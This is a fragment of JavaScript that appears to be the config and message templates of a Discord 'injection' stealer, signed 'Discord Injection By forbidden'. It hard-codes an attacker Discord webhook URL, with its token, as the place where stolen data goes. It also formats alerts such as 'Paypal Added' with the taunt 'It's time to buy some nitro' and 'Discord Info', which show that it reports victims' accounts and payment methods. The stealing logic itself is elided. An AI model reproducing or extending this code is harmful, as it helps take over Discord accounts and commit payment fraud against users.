...
const config = {
  webhook: 'https://ptb.discord.com/api/webhooks/1297562275405762644/RQ7GyFzRMlU1XTv_WDh_d42Z9tX7ei-mkn4MWulsW0-82LxSpx7EtXlNM1rQRvEtEt9Z', 
  webhook_protector_key: 'https://ptb.discord.com/api/webhooks/1297562275405762644/RQ7GyFzRMlU1XTv_WDh_d42Z9tX7ei-mkn4MWulsW0-82LxSpx7EtXlNM1rQRvEtEt9Z', 
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By forbidden・https://discord.gg/forbidden',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Added**',
            value: `It's time to buy some nitro👀`,
            inline: false,
          },
          {
            name: '**Discord Info**',
